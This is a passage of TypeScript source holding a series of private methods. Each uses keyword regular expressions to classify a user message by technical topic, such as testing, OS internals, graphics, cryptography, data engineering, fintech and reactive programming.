  }

  /** Detect testing & QA engineering queries. */
  private isTestingQAQuery(msg: string): boolean {
    const frameworkPattern = /\b(unit\s+test(ing)?\s+(framework|jest|vitest|mocha|pytest|junit)|test\s+driven\s+development\s+tdd|integration\s+test(ing)?\s+(e2e|cypress|playwright))\b/i
    const techniquePattern = /\b(mock(ing)?\s+(framework|sinon|jest|stub|spy)|behavior\s+driven\s+development\s+bdd|cucumber\s+(gherkin|step|scenario)|mutation\s+test(ing)?\s+(stryker|pitest))\b/i
    const strategyPattern = /\b(code\s+coverage\s+(istanbul|nyc|branch|statement)|property\s+based\s+test(ing)?\s+(hypothesis|quickcheck)|test\s+pyramid\s+(strategy|unit|integration)|flaky\s+test\s+(management|retry|quarantine))\b/i
    return frameworkPattern.test(msg) || techniquePattern.test(msg) || strategyPattern.test(msg)
  }

  /** Detect operating systems & internals queries. */
  private isOSInternalsQuery(msg: string): boolean {
    const processPattern = /\b(linux\s+kernel\s+(process|thread|scheduling|module)|process\s+management\s+(fork|exec|clone)|cpu\s+scheduling\s+(round\s+robin|cfs|priority|preemptive))\b/i
    const memoryPattern = /\b(virtual\s+memory\s+(paging|page\s+table|mmu|tlb)|memory\s+management\s+(heap|stack|allocation|mmap)|page\s+(fault|replacement|table)\s+(lru|clock|tlb))\b/i
    const kernelPattern = /\b(system\s+call\s+(syscall|linux|kernel)|interrupt\s+(handler|irq|trap|exception)|file\s+system\s+(ext4|btrfs|xfs|ntfs|inode)|mutex\s+(semaphore|lock|synchronization)|linux\s+namespace\s+(pid|cgroup|container))\b/i
    return processPattern.test(msg) || memoryPattern.test(msg) || kernelPattern.test(msg)
  }

  /** Detect computer graphics & visualization queries. */
  private isComputerGraphicsQuery(msg: string): boolean {
    const apiPattern = /\b(opengl\s+(vulkan|shader|rendering|pipeline)|vulkan\s+(graphics|api|pipeline|compute)|directx\s+(12|rendering|hlsl|shader)|graphics\s+pipeline\s+(rasterization|vertex|fragment))\b/i
    const renderPattern = /\b(ray\s+tracing\s+(path|global|illumination|bvh)|physically\s+based\s+rendering\s+pbr|shader\s+(vertex|fragment|pixel|compute|program)|webgl\s+(three\.?js|rendering|shader)|webgpu\s+(compute|shader|wgsl))\b/i
    const vizPattern = /\b(3d\s+model(ing)?\s+(mesh|polygon|vertex|skeletal)|data\s+visualization\s+(d3|matplotlib|chart)|volume\s+rendering\s+(scientific|medical|isosurface))\b/i
    return apiPattern.test(msg) || renderPattern.test(msg) || vizPattern.test(msg)
  }

  /** Detect distributed systems & microservices queries. */
  private isDistributedSystemsQuery(msg: string): boolean {
    const theoryPattern = /\b(cap\s+theorem\s+(consistency|availability|partition)|distributed\s+consensus\s+(raft|paxos|algorithm)|eventual\s+consistency\s+(model|strong|causal))\b/i
    const archPattern = /\b(message\s+queue\s+(kafka|rabbitmq|event)|event\s+(sourcing|driven)\s+(cqrs|architecture|pattern)|microservice\s+(architecture|pattern|mesh|gateway)|service\s+(mesh|discovery)\s+(istio|consul|envoy))\b/i
    const dataPattern = /\b(distributed\s+database\s+(sharding|replication|partition)|consistent\s+hashing\s+(ring|partition|virtual)|vector\s+clock\s+(lamport|timestamp|ordering)|kubernetes\s+(pod|deployment|helm|service)|observability\s+(tracing|logging|metrics|opentelemetry))\b/i
    return theoryPattern.test(msg) || archPattern.test(msg) || dataPattern.test(msg)
  }

  /** Detect bioinformatics & computational biology queries. */
  private isBioinformaticsQuery(msg: string): boolean {
    const sequencePattern = /\b(dna\s+(rna\s+)?sequence\s+(alignment|analysis)|genome\s+(sequencing|assembly|annotation)|blast\s+(sequence|search|homology|alignment))\b/i
    const structurePattern = /\b(protein\s+(structure|folding|prediction)\s+(alphafold|pdb|rosetta)|molecular\s+dynamics\s+(simulation|force\s+field)|drug\s+discovery\s+(virtual|screening|docking))\b/i
    const omicsPattern = /\b(rna.?seq\s+(gene|expression|differential)|single\s+cell\s+(sequencing|scrna|seurat|scanpy)|variant\s+calling\s+(snp|mutation|gatk)|metagenomics\s+(microbiome|16s|amplicon)|biopython\s+(bioconductor|sequence|analysis))\b/i
    return sequencePattern.test(msg) || structurePattern.test(msg) || omicsPattern.test(msg)
  }

  /** Detect audio & signal processing queries. */
  private isAudioSignalQuery(msg: string): boolean {
    const dspPattern = /\b(digital\s+audio\s+(processing|dsp|sample)|fourier\s+transform\s+(fft|spectral|analysis)|audio\s+signal\s+(waveform|frequency|spectrum))\b/i
    const synthPattern = /\b(audio\s+synthesis\s+(oscillator|filter|wavetable)|midi\s+(music|programming|sequencer|protocol)|web\s+audio\s+(api|worklet|node|context)|tone\.?js\s+(audio|synth|effect))\b/i
    const analysisPattern = /\b(audio\s+(effect|reverb|delay|distortion|compression|equalizer)|speech\s+(processing|recognition|voice)\s+(mfcc|mel|feature)|music\s+information\s+retrieval\s+(mir|beat|tempo)|audio\s+fingerprint(ing)?\s+(recognition|shazam|matching))\b/i
    return dspPattern.test(msg) || synthPattern.test(msg) || analysisPattern.test(msg)
  }

  /** Detect software architecture pattern queries. */
  private isSoftwareArchitectureQuery(msg: string): boolean {
    const archPattern = /\b(microservices?\s+(architecture|decomposition|pattern|saga|service\s+mesh)|domain\s+driven\s+design\s+(ddd|bounded\s+context|aggregate)|event\s+sourcing\s+(cqrs|event\s+store|replay))\b/i
    const cleanPattern = /\b(clean\s+architecture\s+(hexagonal|onion|layer|dependency)|hexagonal\s+architecture\s+(ports?\s+adapters?|domain)|vertical\s+slice\s+architecture\s+(feature|stack))\b/i
    const dddPattern = /\b(bounded\s+context\s+(context\s+map|ubiquitous|aggregate)|architecture\s+decision\s+record\s+(adr|document|governance)|modular\s+monolith\s+(module|boundary|cohesion))\b/i
    return archPattern.test(msg) || cleanPattern.test(msg) || dddPattern.test(msg)
  }

  /** Detect devtools & build system queries. */
  private isDevToolsBuildQuery(msg: string): boolean {
    const bundlerPattern = /\b(webpack\s+(bundler|module\s+federation|code\s+splitting|loader)|vite\s+(esbuild|hmr|build\s+tool|rollup)|turbopack\s+(rspack|bundler|rust|next))\b/i
    const toolPattern = /\b(eslint\s+(prettier|linter|rule|config|plugin)|npm\s+(yarn|pnpm)\s+(workspace|monorepo|package)|turborepo\s+(nx|lerna|monorepo|cache))\b/i
    const devPattern = /\b(devcontainer\s+(codespace|remote|vscode|development)|git\s+hooks?\s+(husky|lint.staged|pre.commit)|chrome\s+devtools?\s+(debug|performance|profiler|lighthouse))\b/i
    return bundlerPattern.test(msg) || toolPattern.test(msg) || devPattern.test(msg)
  }

  /** Detect AR/VR/XR development queries. */
  private isARVRXRQuery(msg: string): boolean {
    const webPattern = /\b(webxr\s+(virtual\s+reality|augmented\s+reality|device|session)|three\.?js\s+(3d|scene|renderer|camera|webgl)|a.?frame\s+(vr|framework|entity|component))\b/i
    const nativePattern = /\b(unity\s+(vr|xr|interaction\s+toolkit|ar\s+foundation)|unreal\s+(engine\s+vr|blueprint|nanite)|openxr\s+(standard|cross\s+platform|runtime))\b/i
    const spatialPattern = /\b(spatial\s+computing\s+(apple\s+vision|visionos|mixed\s+reality)|arkit\s+(arcore|surface\s+detection|plane)|hand\s+tracking\s+(gesture|recognition|spatial))\b/i
    return webPattern.test(msg) || nativePattern.test(msg) || spatialPattern.test(msg)
  }

  /** Detect LLM & prompt engineering queries. */
  private isLLMPromptQuery(msg: string): boolean {
    const llmPattern = /\b(large\s+language\s+model\s+(gpt|claude|llama|gemini)|transformer\s+(attention|mechanism|self.attention)|prompt\s+engineering\s+(chain\s+of\s+thought|few.shot|technique))\b/i
    const ragPattern = /\b(rag\s+(retrieval\s+augmented|generation|knowledge)|vector\s+database\s+(embedding|similarity|search|pinecone|chromadb)|langchain\s+(llamaindex|framework|orchestration|agent))\b/i
    const finetunePattern = /\b(fine.?tuning\s+(lora|qlora|peft|parameter)|rlhf\s+(reinforcement|learning|human\s+feedback|dpo)|local\s+llm\s+(inference|ollama|llama\.?cpp|gguf)|model\s+quantization\s+(int[48]|gptq|awq))\b/i
    return llmPattern.test(msg) || ragPattern.test(msg) || finetunePattern.test(msg)
  }

  /** Detect geospatial/GIS queries. */
  private isGeospatialGISQuery(msg: string): boolean {
    const mapPattern = /\b(leaflet\s+(mapbox|openlayers|interactive|map)|mapbox\s+(gl|tiles|studio|style)|cesium\s+(deck\.?gl|3d\s+globe|tiles))\b/i
    const spatialPattern = /\b(postgis\s+(spatial|database|geometry|geography)|geojson\s+(topojson|shapefile|spatial|feature)|geocoding\s+(reverse|address|coordinates|routing))\b/i
    const gisPattern = /\b(qgis\s+(arcgis|desktop|analysis|raster)|spatial\s+analysis\s+(overlay|buffer|geostatistics)|turf\.?js\s+(geospatial|analysis|measurement))\b/i
    return mapPattern.test(msg) || spatialPattern.test(msg) || gisPattern.test(msg)
  }

  /** Detect accessibility/a11y queries. */
  private isAccessibilityA11yQuery(msg: string): boolean {
    const wcagPattern = /\b(wcag\s+(web\s+content|accessibility|guidelines|level)|aria\s+(role|attribute|landmark|live\s+region|label)|screen\s+reader\s+(nvda|jaws|voiceover|assistive))\b/i
    const a11yPattern = /\b(keyboard\s+(navigation|focus|management|tab\s+order|accessible)|color\s+contrast\s+(ratio|accessible|wcag|palette)|accessibility\s+(testing|audit|axe|lighthouse|compliance))\b/i
    const inclusivePattern = /\b(inclusive\s+design\s+(universal|disability|assistive)|semantic\s+html\s+(heading|structure|accessible|alt\s+text)|accessible\s+component\s+(library|react\s+aria|radix))\b/i
    return wcagPattern.test(msg) || a11yPattern.test(msg) || inclusivePattern.test(msg)
  }

  private isTemporalQuery(msg: string): boolean {
    const timePattern = /\b(before\s+(and\s+)?after|timeline\s+(of|for|analysis)|sequence\s+of\s+events|chronolog(y|ical)|temporal\s+(order|relation|analysis))\b/i
    const whenPattern = /\b(when\s+did\s+(this|that|it)|happened\s+(before|after|first|last)|order\s+of\s+(events|operations|execution))\b/i
    const historyPattern = /\b(event\s+timeline|time.?series\s+analysis|causal\s+order|temporal\s+reasoning|historical\s+sequence)\b/i
    return timePattern.test(msg) || whenPattern.test(msg) || historyPattern.test(msg)
  }

  private isArgumentQuery(msg: string): boolean {
    const logicPattern = /\b(logical\s+fallac(y|ies)|argument\s+(strength|validity|structure|analysis)|straw\s*man|ad\s+hominem|red\s+herring)\b/i
    const debatePattern = /\b(debate\s+(analysis|evaluate)|claim\s+(and\s+)?evidence|counter.?argument|logical\s+(structure|reasoning|analysis))\b/i
    const biasPattern = /\b(cognitive\s+bias(es)?|confirmation\s+bias|detect\s+(bias|fallac)|reasoning\s+(error|flaw))\b/i
    return logicPattern.test(msg) || debatePattern.test(msg) || biasPattern.test(msg)
  }

  private isNarrativeQuery(msg: string): boolean {
    const storyPattern = /\b(tell\s+(me\s+)?a\s+story|narrative\s+(structure|arc|generation)|story\s+(beat|arc|telling))\b/i
    const explainPattern = /\b(walk\s+me\s+through|step.by.step\s+(explanation|walkthrough)|explain\s+(like|as\s+if|using\s+a\s+story))\b/i
    const creativePattern = /\b(creative\s+writing\s+(prompt|exercise)|plot\s+(structure|development|twist)|character\s+(development|arc))\b/i
    return storyPattern.test(msg) || explainPattern.test(msg) || creativePattern.test(msg)
  }

  private isDataEngineeringQuery(msg: string): boolean {
    const sparkPattern = /\b(apache\s+spark\s+(rdd|dataframe|sql|streaming|mllib)|pyspark\s+(structured\s+streaming|udf|catalyst)|spark\s+(partition|executor|driver|cluster))\b/i
    const pipelinePattern = /\b(data\s+pipeline\s+(orchestrat|schedule|etl|elt|design)|airflow\s+(dag|operator|sensor|xcom|scheduler)|dagster\s+(asset|op|graph|repository))\b/i
    const warehousePattern = /\b(dbt\s+(model|test|source|snapshot|seed)|data\s+warehouse\s+(snowflake|bigquery|redshift|lakehouse)|delta\s+lake\s+(iceberg|hudi|table\s+format|acid))\b/i
    return sparkPattern.test(msg) || pipelinePattern.test(msg) || warehousePattern.test(msg)
  }

  private isSREQuery(msg: string): boolean {
    const sloPattern = /\b(sli\s+(slo|sla|service\s+level)|error\s+budget\s+(reliability|exhausted|calculation)|service\s+level\s+(indicator|objective|agreement))\b/i
    const incidentPattern = /\b(incident\s+(management|commander|response|severity)|blameless\s+postmortem\s+(review|template|action)|on.?call\s+(rotation|escalation|runbook|pagerduty))\b/i
    const chaosPattern = /\b(chaos\s+engineering\s+(monkey|gremlin|litmus|experiment)|game\s*day\s+(chaos|failure|resilience)|disaster\s+recovery\s+(rpo|rto|failover|strategy))\b/i
    return sloPattern.test(msg) || incidentPattern.test(msg) || chaosPattern.test(msg)
  }

  private isPerformanceEngineeringQuery(msg: string): boolean {
    const profilingPattern = /\b(flame\s+graph\s+(cpu|memory|profil)|performance\s+profil(ing|er)\s+(chrome|node|java|python)|cpu\s+profil(ing|er)\s+(sampling|instrumentation|call\s+stack))\b/i
    const loadTestPattern = /\b(load\s+test(ing)?\s+(k6|jmeter|gatling|locust|artillery)|stress\s+test(ing)?\s+(capacity|breaking\s+point|spike)|benchmark(ing)?\s+(throughput|latency|rps))\b/i
    const cachingPattern = /\b(caching\s+strateg(y|ies)\s+(redis|memcached|cdn|invalidation)|cache\s+(aside|through|behind|eviction|lru|ttl)|core\s+web\s+vitals?\s+(lcp|fid|cls|inp|ttfb))\b/i
    return profilingPattern.test(msg) || loadTestPattern.test(msg) || cachingPattern.test(msg)
  }

  private isTechnicalWritingQuery(msg: string): boolean {
    const docsPattern = /\b(api\s+documentation\s+(openapi|swagger|reference)|documentation\s+generator\s+(jsdoc|typedoc|sphinx|rustdoc)|readme\s+(template|best\s+practice|structure))\b/i
    const adrPattern = /\b(architecture\s+decision\s+record\s+(adr|template|format)|technical\s+specification\s+(document|template|rfc)|design\s+document\s+(review|proposal|template))\b/i
    const diagramPattern = /\b(mermaid\s+(diagram|flowchart|sequence|class)|plantuml\s+(uml|diagram|sequence|class)|docusaurus\s+(mkdocs|vitepress|gitbook|documentation\s+site))\b/i
    return docsPattern.test(msg) || adrPattern.test(msg) || diagramPattern.test(msg)
  }

  private isOpenSourceQuery(msg: string): boolean {
    const licensePattern = /\b(open\s+source\s+licens(e|ing)\s+(mit|gpl|apache|bsd)|permissive\s+(copyleft|license|licensing)|license\s+compatibility\s+(gpl|apache|mit))\b/i
    const semverPattern = /\b(semantic\s+versioning\s+(semver|major|minor|patch)|conventional\s+commits?\s+(changelog|release|type)|keep\s+a?\s+changelog\s+(format|standard))\b/i
    const communityPattern = /\b(contributing\s+guide(lines)?\s+(code\s+of\s+conduct|pr\s+template)|open\s+source\s+(maintainer|governance|community)|inner.?source\s+(enterprise|practice|internal))\b/i
    return licensePattern.test(msg) || semverPattern.test(msg) || communityPattern.test(msg)
  }

  private isPrivacyEngineeringQuery(msg: string): boolean {
    const gdprPattern = /\b(gdpr\s+(compliance|regulation|principle|right|fine)|data\s+protection\s+(regulation|officer|impact\s+assessment)|right\s+to\s+(erasure|be\s+forgotten|access|portability))\b/i
    const privacyPattern = /\b(privacy\s+by\s+design\s+(default|principle|assessment)|consent\s+management\s+(platform|cmp|cookie|banner)|dpia\s+(data\s+protection|impact|assessment|risk))\b/i
    const piiPattern = /\b(pii\s+(detection|classification|personally\s+identifiable)|data\s+anonymization\s+(pseudonymization|differential\s+privacy)|ccpa\s+(cpra|california|consumer\s+privacy))\b/i
    return gdprPattern.test(msg) || privacyPattern.test(msg) || piiPattern.test(msg)
  }

  private isEdgeServerlessQuery(msg: string): boolean {
    const lambdaPattern = /\b(aws\s+lambda\s+(serverless|function|handler|cold\s+start)|serverless\s+framework\s+(sam|cdk|sst|deploy)|lambda\s+(trigger|layer|concurrency|provisioned))\b/i
    const edgePattern = /\b(cloudflare\s+workers?\s+(v8|isolate|kv|durable|wasm)|vercel\s+edge\s+(function|runtime|middleware)|edge\s+computing\s+(cdn|cache|latency|global))\b/i
    const faasPattern = /\b(function\s+as\s+a\s+service\s+(faas|event|trigger)|step\s+functions?\s+(state\s+machine|orchestrat|workflow)|serverless\s+database\s+(planetscale|neon|turso|supabase))\b/i
    return lambdaPattern.test(msg) || edgePattern.test(msg) || faasPattern.test(msg)
  }

  private isLowCodeQuery(msg: string): boolean {
    const toolPattern = /\b(retool\s+(internal\s+tool|admin|dashboard|builder)|low.?code\s+platform\s+(appsmith|tooljet|budibase)|visual\s+programming\s+(drag\s+drop|component|builder))\b/i
    const autoPattern = /\b(zapier\s+(automation|workflow|trigger|zap)|n8n\s+(make|integromat|workflow|automation)|no.?code\s+automation\s+(ifttt|webhook|integration))\b/i
    const noCodePattern = /\b(airtable\s+(notion|database|spreadsheet)|webflow\s+(bubble|squarespace|website\s+builder)|citizen\s+developer\s+(low.?code|governance|shadow\s+it))\b/i
    return toolPattern.test(msg) || autoPattern.test(msg) || noCodePattern.test(msg)
  }

  private isIaCQuery(msg: string): boolean {
    const terraformPattern = /\b(terraform\s+(hcl|provider|resource|module|state|plan|apply)|terraform\s+state\s+(management|backend|remote|locking)|infrastructure\s+as\s+code\s+(iac|terraform|pulumi))\b/i
    const altPattern = /\b(pulumi\s+(typescript|python|go|aws\s+cdk|infrastructure)|ansible\s+(playbook|role|inventory|configuration)|aws\s+cdk\s+(construct|stack|synthesize|cloudformation))\b/i
    const opsPattern = /\b(infrastructure\s+drift\s+(detection|remediation|compliance)|gitops\s+(flux|argocd|atlantis|reconciliation)|iac\s+testing\s+(terratest|checkov|tfsec|policy))\b/i
    return terraformPattern.test(msg) || altPattern.test(msg) || opsPattern.test(msg)
  }

  private isObservabilityQuery(msg: string): boolean {
    const promPattern = /\b(prometheus\s+(metrics|scraping|alertmanager|promql)|grafana\s+(dashboard|visualization|panel|loki|tempo)|opentelemetry\s+(otlp|traces|spans|instrumentation))\b/i
    const tracePattern = /\b(distributed\s+trac(ing|e)\s+(jaeger|zipkin|tempo|collector)|log\s+aggregation\s+(elk|elasticsearch|loki|fluentd)|structured\s+logging\s+(json|correlation|context))\b/i
    const monPattern = /\b(synthetic\s+monitoring\s+(uptime|health\s+check|pingdom)|real\s+user\s+monitoring\s+(rum|performance|web\s+vitals)|datadog\s+(newrelic|dynatrace|apm|monitoring))\b/i
    return promPattern.test(msg) || tracePattern.test(msg) || monPattern.test(msg)
  }

  private isDigitalTwinsQuery(msg: string): boolean {
    const twinPattern = /\b(digital\s+twin\s+(virtual|model|synchronization|iot)|physics\s+simulation\s+(finite\s+element|fem|fea)|agent\s+based\s+model(ing)?\s+(simulation|complex|adaptive))\b/i
    const simPattern = /\b(monte\s+carlo\s+simulation\s+(random|probability|sampling)|discrete\s+event\s+simulation\s+(queuing|simpy|process)|system\s+dynamics\s+(feedback|stock|flow|causal))\b/i
    const advPattern = /\b(computational\s+fluid\s+dynamics\s+(cfd|navier|turbulence)|simulation\s+optimization\s+(genetic|parameter|bayesian)|hardware\s+in\s+.?loop\s+(hil|testing|embedded))\b/i
    return twinPattern.test(msg) || simPattern.test(msg) || advPattern.test(msg)
  }

  private isNLGQuery(msg: string): boolean {
    const nlgPattern = /\b(natural\s+language\s+generation\s+(template|pipeline|nlg)|text\s+generation\s+(gpt|language\s+model|autoregressive)|nlg\s+(pipeline|content|document|realization))\b/i
    const transformPattern = /\b(text\s+summarization\s+(extractive|abstractive|compression)|paraphras(e|ing)\s+(sentence|rewriting|style\s+transfer)|grammar\s+(checking|correction|grammarly|language\s+tool))\b/i
    const appliedPattern = /\b(dialogue\s+system\s+(response|generation|chatbot)|data\s+to\s+text\s+(report|narrative|automated)|content\s+generation\s+(seo|copywriting|marketing))\b/i
    return nlgPattern.test(msg) || transformPattern.test(msg) || appliedPattern.test(msg)
  }

  private isComputerVisionQuery(msg: string): boolean {
    const detectionPattern = /\b(object\s+detection\s+(yolo|ssd|rcnn|faster)|image\s+segmentation\s+(semantic|instance|panoptic|mask)|image\s+classification\s+(resnet|vgg|efficientnet|vit))\b/i
    const processingPattern = /\b(optical\s+flow\s+(motion|estimation|tracking)|image\s+(enhancement|restoration|super\s+resolution|denoising)|3d\s+vision\s+(depth|stereo|point\s+cloud|lidar))\b/i
    const toolPattern = /\b(opencv\s+(image|contour|feature|camera)|face\s+(detection|recognition|landmark|deepface)|ocr\s+(optical|tesseract|paddle|text\s+detection))\b/i
    return detectionPattern.test(msg) || processingPattern.test(msg) || toolPattern.test(msg)
  }

  private isCryptographyQuery(msg: string): boolean {
    const symmetricPattern = /\b(symmetric\s+encryption\s+(aes|des|block|stream)|public\s+key\s+(cryptography|rsa|ecc|elliptic)|hash\s+function\s+(sha|md5|blake|hmac))\b/i
    const appliedPattern = /\b(tls\s+(ssl|https|certificate|handshake|1\.3)|post.?quantum\s+(cryptography|lattice|kyber|dilithium)|zero.?knowledge\s+(proof|zkp|snark|stark))\b/i
    const advancedPattern = /\b(homomorphic\s+encryption\s+(fully|partially|compute)|secure\s+multi.?party\s+(computation|mpc|secret)|digital\s+signature\s+(ecdsa|ed25519|rsa))\b/i
    return symmetricPattern.test(msg) || appliedPattern.test(msg) || advancedPattern.test(msg)
  }

  private isRecommendationQuery(msg: string): boolean {
    const cfPattern = /\b(collaborative\s+filtering\s+(user|item|matrix|svd)|content.?based\s+(filtering|recommendation|similarity)|recommendation\s+(system|engine|personalization))\b/i
    const deepPattern = /\b(neural\s+collaborative\s+(filtering|ncf|embedding)|session.?based\s+(recommendation|sequential|gru4rec)|multi.?armed\s+(bandit|exploration|thompson|ucb))\b/i
    const evalPattern = /\b(recommendation\s+(evaluation|precision|recall|ndcg)|cold\s+start\s+(problem|new\s+user|new\s+item)|explainable\s+(recommendation|attention|counterfactual))\b/i
    return cfPattern.test(msg) || deepPattern.test(msg) || evalPattern.test(msg)
  }

  private isDataVisualizationQuery(msg: string): boolean {
    const chartPattern = /\b(data\s+visualization\s+(chart|bar|line|scatter)|dashboard\s+(design|layout|tableau|power\s+bi|grafana)|grammar\s+of\s+graphics\s+(ggplot|vega|d3))\b/i
    const toolPattern = /\b(d3\.?js\s+(chart|interactive|svg)|plotly\s+(chart|interactive|dash)|matplotlib\s+(plot|figure|seaborn|pyplot))\b/i
    const advPattern = /\b(interactive\s+visualization\s+(brush|link|zoom)|geospatial\s+visualization\s+(map|choropleth|leaflet)|storytelling\s+with\s+data\s+(narrative|annotation))\b/i
    return chartPattern.test(msg) || toolPattern.test(msg) || advPattern.test(msg)
  }

  private isEventDrivenQuery(msg: string): boolean {
    const edaPattern = /\b(event.?driven\s+(architecture|eda|design|pattern)|message\s+broker\s+(kafka|rabbitmq|pulsar|nats)|event\s+sourcing\s+(cqrs|command|query|replay))\b/i
    const sagaPattern = /\b(saga\s+pattern\s+(choreography|orchestration|distributed)|cqrs\s+(pattern|command|query|read\s+model)|pub.?sub\s+(publish|subscribe|topic|fan))\b/i
    const reliabilityPattern = /\b(dead\s+letter\s+(queue|dlq|retry|failed)|exactly.?once\s+(delivery|processing|semantic)|outbox\s+pattern\s+(transactional|reliable|event))\b/i
    return edaPattern.test(msg) || sagaPattern.test(msg) || reliabilityPattern.test(msg)
  }

  private isRealTimeQuery(msg: string): boolean {
    const streamPattern = /\b(stream\s+processing\s+(flink|kafka\s+streams|spark\s+streaming)|real.?time\s+(system|streaming|data\s+pipeline)|websocket\s+(server.?sent|sse|full.?duplex|connection))\b/i
    const latencyPattern = /\b(low.?latency\s+(networking|kernel\s+bypass|dpdk|rdma)|clock\s+(synchronization|ntp|ptp|vector|lamport)|backpressure\s+(flow\s+control|reactive|rate\s+limit))\b/i
    const analyticsPattern = /\b(real.?time\s+analytics\s+(olap|aggregation|streaming)|windowing\s+(tumbling|sliding|session|watermark)|change\s+data\s+capture\s+(cdc|debezium|binlog))\b/i
    return streamPattern.test(msg) || latencyPattern.test(msg) || analyticsPattern.test(msg)
  }

  private isTypeTheoryQuery(msg: string): boolean {
    const typePattern = /\b(type\s+theory\s+(dependent|linear|refinement)|dependent\s+type\s+(coq|agda|lean|idris)|linear\s+type\s+(rust|ownership|affine|use\s+once))\b/i
    const formalPattern = /\b(model\s+checking\s+(temporal|ltl|ctl|spin|nusmv)|theorem\s+prov(er|ing)\s+(coq|lean|isabelle|proof\s+assistant)|formal\s+verification\s+(correctness|safety|liveness))\b/i
    const appliedPattern = /\b(abstract\s+interpretation\s+(static|analysis|soundness)|design\s+by\s+contract\s+(precondition|postcondition|invariant)|curry.?howard\s+(correspondence|isomorphism|proofs))\b/i
    return typePattern.test(msg) || formalPattern.test(msg) || appliedPattern.test(msg)
  }

  private isScientificComputingQuery(msg: string): boolean {
    const hpcPattern = /\b(high\s+performance\s+computing\s+(hpc|supercomputer|cluster)|parallel\s+computing\s+(openmp|thread|simd|vectorization)|gpu\s+computing\s+(cuda|opencl|nvidia|tensor\s+core))\b/i
    const mpiPattern = /\b(mpi\s+(message\s+passing|distributed|send|recv|collective)|numerical\s+method\s+(finite\s+element|fem|finite\s+difference)|scientific\s+computing\s+(simulation|modeling|solver))\b/i
    const infraPattern = /\b(hpc\s+storage\s+(lustre|gpfs|parallel\s+file)|cluster\s+management\s+(slurm|pbs|job\s+scheduler)|linear\s+algebra\s+(lapack|blas|petsc|scalapack))\b/i
    return hpcPattern.test(msg) || mpiPattern.test(msg) || infraPattern.test(msg)
  }

  private isFinTechQuery(msg: string): boolean {
    const paymentPattern = /\b(payment\s+(processing|gateway|stripe|adyen|pci)|open\s+banking\s+(psd2|api|banking.?as.?a.?service)|fintech\s+(financial|digital\s+banking|neobank))\b/i
    const lendingPattern = /\b(credit\s+scoring\s+(fico|underwriting|alternative)|algorithmic\s+trading\s+(hft|quantitative|execution)|lending\s+(platform|p2p|bnpl|buy.?now.?pay))\b/i
    const compliancePattern = /\b(kyc\s+(know\s+your\s+customer|identity|verification)|aml\s+(anti.?money\s+laundering|sanctions|transaction)|regulatory\s+(compliance|reporting|regtech))\b/i
    return paymentPattern.test(msg) || lendingPattern.test(msg) || compliancePattern.test(msg)
  }

  private isHealthcareITQuery(msg: string): boolean {
    const ehrPattern = /\b(electronic\s+health\s+record\s+(ehr|emr|epic|cerner)|fhir\s+(hl7|resource|api|smart\s+on|interoperability)|hipaa\s+(compliance|phi|protected\s+health|security\s+rule))\b/i
    const telePattern = /\b(telemedicine\s+(telehealth|remote|video\s+consult)|remote\s+patient\s+(monitoring|wearable|iot)|clinical\s+decision\s+(support|cdss|alert|rule))\b/i
    const imagingPattern = /\b(medical\s+imaging\s+(pacs|dicom|radiology|ai)|health\s+data\s+(analytics|population|readmission)|clinical\s+(trial|pathway|pharmacovigilance))\b/i
    return ehrPattern.test(msg) || telePattern.test(msg) || imagingPattern.test(msg)
  }

  private isGraphDatabaseQuery(msg: string): boolean {
    const graphPattern = /\b(graph\s+database\s+(neo4j|property|cypher|neptune)|rdf\s+(sparql|knowledge\s+graph|ontology|triple)|graph\s+algorithm\s+(pagerank|shortest|community|centrality))\b/i
    const kgPattern = /\b(knowledge\s+graph\s+(construction|entity|relation|wikidata)|graph\s+neural\s+(network|gnn|gcn|gat|sage)|graph\s+(embedding|node2vec|transe|rotate))\b/i
    const vizPattern = /\b(graph\s+visualization\s+(force|hierarchical|gephi|cytoscape)|property\s+graph\s+(model|node|edge|traversal)|triple\s+store\s+(jena|virtuoso|blazegraph|stardog))\b/i
    return graphPattern.test(msg) || kgPattern.test(msg) || vizPattern.test(msg)
  }

  private isChaosEngineeringQuery(msg: string): boolean {
    const chaosPattern = /\b(chaos\s+(engineering|monkey|experiment|injection)|fault\s+injection\s+(network|resource|dependency|tool)|chaos\s+(mesh|litmus|gremlin|toxiproxy))\b/i
    const resiliencePattern = /\b(resilience\s+pattern\s+(circuit\s+breaker|bulkhead|retry)|steady.?state\s+(hypothesis|metric|baseline)|gameday\s+(exercise|disaster|tabletop|simulation))\b/i
    const sloPattern = /\b(error\s+budget\s+(slo|sli|burn\s+rate)|blast\s+radius\s+(control|canary|rollback)|resilience\s+(testing|engineering|pattern|fallback))\b/i
    return chaosPattern.test(msg) || resiliencePattern.test(msg) || sloPattern.test(msg)
  }

  private isAdvancedAlgorithmsQuery(msg: string): boolean {
    const dpPattern = /\b(dynamic\s+programming\s+(tabular|memoization|state\s+transition)|knapsack\s+(problem|01|unbounded)|longest\s+common\s+(subsequence|substring)|edit\s+distance\s+(levenshtein|algorithm))\b/i
    const graphAlgoPattern = /\b(dijkstra\s+(algorithm|shortest|path)|bellman.?ford\s+(algorithm|negative)|floyd.?warshall\s+(all.?pairs|algorithm)|topological\s+sort\s+(dag|kahn|dfs)|tarjan\s+(scc|strongly|algorithm))\b/i
    const structPattern = /\b(bloom\s+filter\s+(membership|false\s+positive|probabilistic)|hyperloglog\s+(cardinality|estimation|count)|segment\s+tree\s+(range|query|lazy)|fenwick\s+tree\s+(binary\s+indexed|prefix|bit))\b/i
    return dpPattern.test(msg) || graphAlgoPattern.test(msg) || structPattern.test(msg)
  }

  private isConcurrencyPatternsQuery(msg: string): boolean {
    const actorPattern = /\b(actor\s+model\s+(akka|erlang|message|mailbox)|message\s+passing\s+(async|actor|mailbox)|supervision\s+(tree|strategy|one.for.one))\b/i
    const cspPattern = /\b(csp\s+(channel|go|communicating)|lock.?free\s+(algorithm|cas|queue|stack)|compare.?and.?swap\s+(atomic|cas|operation))\b/i
    const memoryModelPattern = /\b(memory\s+model\s+(java|jmm|c\+\+|happens)|happens.?before\s+(relation|guarantee|volatile)|software\s+transactional\s+memory\s+(stm|clojure|mvcc))\b/i
    return actorPattern.test(msg) || cspPattern.test(msg) || memoryModelPattern.test(msg)
  }

  private isReactiveProgrammingQuery(msg: string): boolean {
    const rxPattern = /\b(reactive\s+stream\s+(rxjs|rxjava|reactor|observable)|rxjs\s+(observable|operator|pipe|subscription)|project\s+reactor\s+(mono|flux|webflux))\b/i
    const backpressurePattern = /\b(backpressure\s+(strategy|buffer|drop|throttle)|reactive\s+manifesto\s+(resilient|elastic|message)|functional\s+reactive\s+(programming|signal|behavior))\b/i
